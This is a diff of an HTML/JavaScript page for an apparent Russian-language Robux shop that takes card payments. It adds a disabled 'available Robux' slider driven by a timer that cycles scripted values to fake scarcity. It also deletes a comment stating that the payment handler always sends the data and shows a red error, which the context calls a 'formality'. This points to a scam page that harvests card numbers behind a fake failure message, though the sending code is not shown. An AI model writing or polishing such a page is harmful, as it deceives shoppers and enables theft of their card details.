@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Excellent Shop — Robux</title>
+    <title>Excellent Shop — приятные робуксы</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', system-ui, 'Segoe UI', sans-serif; }
         body { min-height: 100vh; background: linear-gradient(145deg, #f0e6ff 0%, #e9d9ff 100%); position: relative; overflow-x: hidden; }
@@ -26,12 +26,70 @@
         .logout-btn { background: none; border: 1px solid #c99494; padding: 6px 16px; border-radius: 40px; cursor: pointer; }
         .cart-icon-btn { background: #decbff; border: none; border-radius: 60px; padding: 10px 20px; font-weight: bold; font-size: 1rem; color: #5d3b80; cursor: pointer; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
         .cart-icon-btn:hover { background: #ceb5ff; transform: scale(1.02); }
+        
+        /* ползунок */
+        .stock-panel {
+            background: #ffffffcc;
+            border-radius: 60px;
+            padding: 20px 30px;
+            margin-bottom: 30px;
+            text-align: center;
+            backdrop-filter: blur(4px);
+        }
+        .stock-label {
+            font-size: 1.4rem;
+            font-weight: bold;
+            color: #6a37a3;
+            margin-bottom: 10px;
+        }
+        .stock-value {
+            font-size: 2rem;
+            font-weight: 800;
+            color: #9b4eff;
+            margin-bottom: 15px;
+        }
+        input[type=range] {
+            -webkit-appearance: none;
+            width: 100%;
+            background: transparent;
+        }
+        input[type=range]:focus {
+            outline: none;
+        }
+        input[type=range]::-webkit-slider-runnable-track {
+            width: 100%;
+            height: 8px;
+            background: #decbff;
+            border-radius: 10px;
+        }
+        input[type=range]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            height: 22px;
+            width: 22px;
+            border-radius: 50%;
+            background: #b87eff;
+            margin-top: -7px;
+            cursor: pointer;
+            box-shadow: 0 0 6px #9b4eff;
+        }
+        input[type=range]:disabled::-webkit-slider-thumb {
+            background: #aa88cc;
+            cursor: default;
+        }
+        input[type=range]::-webkit-slider-runnable-track {
+            background: #decbff;
+        }
+        .slider-info {
+            font-size: 0.8rem;
+            color: #8a6bbf;
+            margin-top: 8px;
+        }
+        
         .products-grid { display: flex; flex-wrap: wrap; gap: 25px; justify-content: center; margin: 30px 0; }
         .product-card { background: #ffffffdd; backdrop-filter: blur(4px); border: 1px solid #decbff; border-radius: 32px; padding: 24px 20px; width: 260px; text-align: center; transition: 0.2s; }
         .product-card:hover { transform: translateY(-6px); background: white; border-color: #b77eff; }
         .price { font-size: 1.8rem; font-weight: bold; color: #9b4eff; margin: 14px 0; }
         .btn-buy { background: linear-gradient(135deg, #c38eff, #a05fe8); border: none; width: 100%; padding: 12px; border-radius: 40px; font-weight: bold; color: white; cursor: pointer; }
-        /* модалка корзины */
         .cart-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(80,50,120,0.5); backdrop-filter: blur(6px); justify-content: center; align-items: center; z-index: 1000; }
         .cart-modal-content { background: white; border-radius: 48px; padding: 28px; width: 450px; max-width: 90%; border: 1px solid #d0aeff; position: relative; max-height: 90vh; overflow-y: auto; }
         .cart-modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
@@ -57,7 +115,7 @@
     <div id="authSection" class="auth-wrapper">
         <div class="auth-card">
             <div class="auth-title">✨ Excellent Shop ✨</div>
-            <div class="auth-sub">только robux</div>
+            <div class="auth-sub">приятные робуксы</div>
             <div id="authForm">
                 <div id="signinForm">
                     <div class="input-group"><input type="text" id="loginUsername" placeholder="логин или email"></div>
@@ -90,13 +148,21 @@
             <button class="cart-icon-btn" id="openCartBtn">🛒 корзина (<span id="cartCount">0</span>)</button>
         </div>
 
+        <!-- Ползунок и динамический запас -->
+        <div class="stock-panel">
+            <div class="stock-label">✨ доступно робуксов ✨</div>
+            <div class="stock-value" id="stockValueDisplay">150 000</div>
+            <input type="range" id="stockSlider" min="100" max="150000" value="150000" step="1" disabled>
+            <div class="slider-info">автоматическое обновление каждые 3 секунды</div>
+        </div>
+
         <div class="products-grid">
             <div class="product-card"><div class="robux-icon">💎✨</div><h3>100 Robux</h3><div class="price">49 ₽</div><button class="btn-buy" data-name="100 Robux" data-price="49">купить</button></div>
             <div class="product-card"><div class="robux-icon">💎💎✨</div><h3>400 Robux</h3><div class="price">189 ₽</div><button class="btn-buy" data-name="400 Robux" data-price="189">купить</button></div>
             <div class="product-card"><div class="robux-icon">💎💎💎✨</div><h3>800 Robux</h3><div class="price">359 ₽</div><button class="btn-buy" data-name="800 Robux" data-price="359">купить</button></div>
             <div class="product-card"><div class="robux-icon">👑✨</div><h3>2000 Robux</h3><div class="price">899 ₽</div><button class="btn-buy" data-name="2000 Robux" data-price="899">купить</button></div>
         </div>
-        <footer>⭐ Excellent Shop — оплата картой ⭐</footer>
+        <footer>⭐ Excellent Shop — приятные робуксы ⭐</footer>
     </div>
 </div>
 
@@ -153,6 +219,83 @@
     }
     drawStars();
 
+    // --- автоматический цикл изменения запаса робуксов ---
+    let currentStock = 150000;  // начальное значение
+    const stockDisplay = document.getElementById('stockValueDisplay');
+    const stockSlider = document.getElementById('stockSlider');
+    
+    // последовательность значений для уменьшения
+    const decreaseSteps = [1940, 5620, 10161];
+    let stepIndex = 0;
+    let phase = 'decrease'; // 'decrease' или 'increase'
+    let increaseCounter = 0; // для прибавок 50000, 100000, потом сброс
+    
+    function updateStockUI() {
+        // округлим до целого
+        currentStock = Math.round(currentStock);
+        if (currentStock < 100) currentStock = 100;
+        if (currentStock > 150000) currentStock = 150000;
+        let formatted = currentStock.toLocaleString('ru-RU');
+        stockDisplay.innerText = formatted;
+        stockSlider.value = currentStock;
+    }
+    
+    function applyNextStockChange() {
+        if (phase === 'decrease') {
+            // если ещё есть шаги уменьшения
+            if (stepIndex < decreaseSteps.length) {
+                currentStock = decreaseSteps[stepIndex];
+                stepIndex++;
+                updateStockUI();
+                // после последнего шага проверим, меньше ли 5000
+                if (stepIndex === decreaseSteps.length && currentStock < 5000) {
+                    phase = 'increase';
+                    increaseCounter = 0;
+                    // сразу применим первое увеличение? нет, подождём следующего тика
+                }
+            } else {
+                // шаги кончились, но возможно запас уже меньше 5000
+                if (currentStock < 5000) {
+                    phase = 'increase';
+                    increaseCounter = 0;
+                } else {
+                    // если запас не меньше 5000, просто сбросим индекс и начнём заново
+                    stepIndex = 0;
+                    phase = 'decrease';
+                }
+            }
+        } 
+        else if (phase === 'increase') {
+            // увеличиваем в соответствии с counter: 0 -> +50000, 1 -> +100000, потом сброс цикла
+            if (increaseCounter === 0) {
+                currentStock += 50000;
+                increaseCounter++;
+            } else if (increaseCounter === 1) {
+                currentStock += 100000;
+                increaseCounter++;
+            } else {
+                // после двух прибавок возвращаемся к уменьшению, сбрасываем шаги
+                phase = 'decrease';
+                stepIndex = 0;
+                // также убедимся, что запас стал не менее 5000, но можно оставить как есть
+                if (currentStock < 5000) currentStock = 5000;
+                updateStockUI();
+                return;
+            }
+            updateStockUI();
+            // после увеличения проверяем, не стал ли запас больше 150000? ограничим
+            if (currentStock > 150000) currentStock = 150000;
+            updateStockUI();
+            // не переключаем фазу, следующий тик снова increase
+        }
+        updateStockUI();
+    }
+    
+    // запускаем цикл: каждые 3 секунды меняем запас
+    setInterval(() => {
+        applyNextStockChange();
+    }, 3000);
+    
     // красная метка (формальность)
     function showErrorToast() {
         let oldToasts = document.querySelectorAll('.error-toast');
@@ -259,7 +402,7 @@
     closeCartBtn?.addEventListener('click',()=>{ cartModal.style.display='none'; });
     window.addEventListener('click',(e)=>{ if(e.target===cartModal) cartModal.style.display='none'; });
 
-    // оплата: всегда отправляем и показываем красную метку
+    // оплата
     document.getElementById('finalPayBtn')?.addEventListener('click', async () => {
         if(cart.length===0) { alert('корзина пуста'); return; }
         let cardNum = document.getElementById('cardNumber').value.trim();
